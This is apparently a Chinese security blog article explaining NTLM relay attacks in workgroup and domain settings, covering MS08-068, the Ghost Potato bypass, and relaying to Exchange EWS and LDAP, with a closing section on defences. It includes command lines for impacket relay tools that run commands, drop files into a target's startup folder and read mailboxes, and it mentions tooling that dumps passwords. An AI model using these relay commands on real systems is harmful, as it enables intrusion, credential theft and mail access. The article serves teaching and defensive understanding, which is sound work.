1.  工作组环境：在工作组环境中，工作组中的机器之间相互没有信任关系，除非两台机器的账号密码相同，否则 Relay 不成功。但是如果账号密码相同的话，为何不直接 Pass The Hash 攻击呢？因此在工作组环境下，Relay 到其他机器不太现实。那么，我们可以 Relay 到机器自身吗？答案是可以的。但是后来微软在 MS08-068 补丁中对 Relay 到自身机器做了限制，严禁 Relay 到机器自身。道高一尺魔高一丈，这个补丁在 CVE-2019-1384(Ghost Potato) 被攻击者绕过了。
    
2.  域环境：在域环境中，默认普通域用户可以登录除域控外的其他所有机器 (但是为了安全，企业运维人员通常会限制域用户登录的主机)，因此可以将 Net-NTLM Hash Relay 到域内的其他机器。如果是拿到了域控机器的 Net-NTLM Hash，可以 Relay 到除域控外的其他所有机器 (为啥不 Relay 到其他域控，因为域内只有域控默认开启 SMB 签名)。
    

**工作组**

**Relay To Self(MS08-068)**

当拿到用户的 SMB 请求之后，最直接的就是把请求 Relay 回本身，即 Reflect。从而控制机子本身。漏洞危害特别高，该漏洞编号为 MS08-068。微软在 KB957097 补丁里面通过修改 SMB 身份验证答复的验证方式来防止凭据重播，从而解决了该漏洞。防止凭据重播的做法如下:

1.  在 Type 1 阶段，主机 A 访问主机 B 进行 SMB 认证的时候，将 _pszTargetName_ 设置为 CIFS/B
    
2.  在 Type 2 阶段，主机 A 拿到主机 B 发送的 Challenge 挑战值之后，在 lsass 进程里面缓存 (Challenge,CIFS/B)
    

3.  在 Type 3 阶段，主机 B 在拿到主机 A 的认证消息之后，会去查询 lsass 进程里面有没有缓存 (Challenge,CIFS/B)，如果存在缓存，那么认证失败。
    

因为如果主机 A 和主机 B 是不同主机的话，那么 lsass 进程里面就不会缓存 (Challenge,CIFS/B)。如果是同一台主机的话，那 lsass 里面就会缓存 (Challenge,CIFS/B)，这个时候就会认证失败。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmIOkqOA7JbhMkOT9RjzNY5P8QVvFNdog2PovbloCM2mWvWb3j41kfgw/640?wx_fmt=png)

**Ghost Potato(CVE-2019-1384)**

这个漏洞绕过了 KB957097 补丁里面限制不能 Relay 回本机的限制。由于在 KB957097 补丁措施里面这个缓存 (Challenge,CIFS/B) 是有时效性的，这个时间是 300 秒，也就是说 300 秒后，缓存 (Challenge,cifs/B) 就会被清空，这个时候即使主机 A 和主机 B 是同一台主机，那么由于缓存已经被清除，那么 lsass 进程里面肯定没有 (Challenge,CIFS/B) 缓存。

shenaniganslabs 放出了漏洞利用 poc，基于 impacket 进行修改，目前只能支持收到 http 协议请求的情况。该 poc 在 sleep 315 秒之后，再发送 Type 3 认证消息，于是就绕过了 KB957097 补丁。详情：https://shenaniganslabs.io/2019/11/12/Ghost-Potato.html

该 poc 实现的效果是在目标机器的启动目录上传指定的文件

```
python ntlmrelayx.py -t smb://10.211.55.7 -smb2support --gpotato-startup test.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmx7vtibBQ2FJB1FrD5V4by8VmzwZcIKTFfOGueneIRwvwu2l0DoLdh4w/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmic812VWzFpUXbwgveiallBeNIXE0NA0KGGctMAGNodDZ0Ps3q1VkycxQ/640?wx_fmt=png)  

**域环境**

**impacket 下的 smbrelayx.py**

```
./smbrelayx.py -h 10.211.55.7 -c whoami
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmhGwicOxYQCFLDrHkYlJlT7prUicibHicZmfFxXAZwoxBx2icM9icQE1tKticg/640?wx_fmt=png)

**impacket 下的 ntlmrelayx.py**  

```
./ntlmrelayx.py -t smb://10.211.55.7 -c whoami -smb2support
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmkAL6FUesTfibTU8IWPJSelg7K44pic1WCFIP9e7GWvatribhKd0ZT2SZQ/640?wx_fmt=png)

**Responder 下的 MultiRelay.py 脚本**  

该脚本功能强大，通过 ALL 参数可以获得一个稳定的 shell，还有抓密码等其他功能。

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmeOOH9V7d1CDmHVD8OKjq1jE3lBaNkXap1vpIMFyYOILXCBT9FEbM7Q/640?wx_fmt=png)

参看有哪些命令  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmpmFUBbRwibhESiacQQRyBNOy24WMEVwcBhOgFXBib8xFUricathQXmEcyg/640?wx_fmt=png)

执行系统命令  

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmoJAHhQ0FgKxwBdJSXhBrb6ZOBibtHXTb9rMn0ic7Jc4NCt2kGFYrRjRw/640?wx_fmt=png)

抓取内存中的密码

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmSEC5CMLr04ialyBZG5baGmSWtFhfAZJiaA2Gng83bjWq2RR8ibZsg8aibw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

Relay To EWS

Exchange 认证也支持 NTLM SSP 的。于是我们可以将 SMB 流量 Relay 到 Exchange 的 EWS 接口，从而可以进行收发邮件等操作，还可以通过 Homepage 下发规则达到命令执行的效果。关于 Relay To EWS 详细利用，我会在后期文章中讲解，主要是使用 ntlmRelayToEWS.py 脚本。

**收发邮件**

```
python2 ntlmRelayToEWS.py -t https://10.211.55.5/EWS/exchange.asmx -r getFolder -f inbox -v
```

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSmd1T54qxH3gyO931Dicn9F0fONUpZ20FjszUpaIR87q8dhq7fPiagM0sw/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2f7hic1f1LSL2JycsiaN4oqSm5IbvyTmvyWp1XXBxLicu3xibcrEs54jyT7mbRtzm5almNVbnpCFBqiaeA/640?wx_fmt=png)  

#### 

![](https://mmbiz.qpic.cn/mmbiz_gif/rSyd2cclv2f5Z4QSvmgu0bHZ9vZWUyEIWp1oJXcsHG9TZpVedJQOFmJSeEH6GAQdFoGVgID0iaP04M0rbfiaGnfw/640?wx_fmt=gif)

Relay To LDAP

LDAP 服务器默认就是域控，LDAP 的默认策略是协商签名，而并不是强制签名。也就是说是否签名是由客户端决定的。服务端跟客户端协商是否需要签名，不同的协议要求的不同：

*   从 HTTP 协议 Relay 到 LDAP 是不要求进行签名的，可以直接进行 Relay，如 CVE-2018-8581。
    
*   从 SMB 协议 Relay 到 LDAP 是要求进行签名的，这时，并不能直接进行 Relay。CVE-2019-1040 就是绕过了 NTLM 的 MIC 消息完整性校验，使得 SMB 协议 Relay 到 LDAP 时不需要签名，从而可以发动攻击。
    

我们现在就讨论可以 Relay 到 LDAP 后有哪些攻击方式：

1.  利用基于资源的约束性委派进行权限提升
    
2.  Write Dcsync ACL Dump 域内哈希
    

这两种利用方式我会在后面的文章中阐述原理和细节，本文就不细讲了。

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiaWtRttKahE4rd7icPBW6mLiaUbF4gIbibUXe6IU015PNuHGhvHTbQ7HKX6ugMeJqKy7PMvFp2nhbxvA/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/FIBZec7ucCiaWtRttKahE4rd7icPBW6mLiahpj94noZbcm32MmQfloC0I2AcjPTFuLyJ9dF7FVmBlr9veIQ5JefbA/640?wx_fmt=png)

NTLM Relay 的防御

*   SMB & LDAP 签名：默认只有域控是开启了 SMB 签名，而 LDAP 签名默认策略是协商签名，也就是说是否签名是由客户端决定的。服务端跟客户端协商是否签名。(客户端如果是 SMB 协议的话，默认要求签名的，如果是 webadv 或者 http 协议，是不要求签名的)，微软于 2019-09-11 日发布相关通告称微软计划于 2020 年 1 月发布安全更新。为了提升域控制器的安全性，该安全更新将强制开启所有域控制器上 LDAP channel binding 与 LDAP signing 功能。
    
*   EAP (Enhanced Protection Authentication)：NTLM 认证和一个安全通道进行绑定，在 NTLM 认证过程中，最后的 NTLM 认证数据报文包含一个目标应用服务器的证书摘要，这个摘要使用客户端的 NTLM 值进行签名保护，可以防止伪造证书的攻击。
    

如果想跟我一起讨论，那快加入我的知识星球吧！https://t.zsxq.com/7MnIAM7

![](https://mmbiz.qpic.cn/mmbiz_png/rSyd2cclv2eKvY8jwoT7yxMvHfscqNQUJ2ed5fxYvws9QrsiaaXtMqRxaiaWFryhXYVpiaDxVUPA2vBQvj0G0uKicQ/640?wx_fmt=png)